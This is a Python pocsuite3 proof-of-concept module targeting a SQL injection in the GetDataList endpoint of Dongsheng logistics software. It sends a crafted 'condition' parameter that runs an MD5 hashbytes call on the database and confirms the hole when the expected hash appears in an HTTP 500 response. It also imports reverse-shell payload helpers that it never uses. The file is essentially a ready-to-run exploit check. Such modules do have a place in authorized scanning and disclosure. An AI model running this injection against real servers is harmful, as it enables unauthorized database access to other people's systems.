# _*_ coding:utf-8 _*_
# @Time : 2024/2/23
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class dongsheng_getdatalist_sql(POCBase):
    pocDesc = '''东胜物流软件-GetDataList接口SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-23'
    name = '东胜物流软件-GetDataList接口SQL注入漏洞'
    #body="CompanysAdapter.aspx"


    def _verify(self):

        result = {}
        url = self.url+ '/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode%20like%20%27%1%%27%20and%20DrvName%20like%20%27%1%%27%20and%20JzNo%20like%20%27%1%%27%20and%20OrgCode%20like%20%27%1%%27%20AND%204045%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes(%27MD5%27,%275%27)))--%20IkbK&page=1'

        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        try:

            response = requests.get(url, headers=headers)
            if response.status_code == 500 and 'e4da3b7fbbce2345d7772b0674a318d5' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(dongsheng_getdatalist_sql)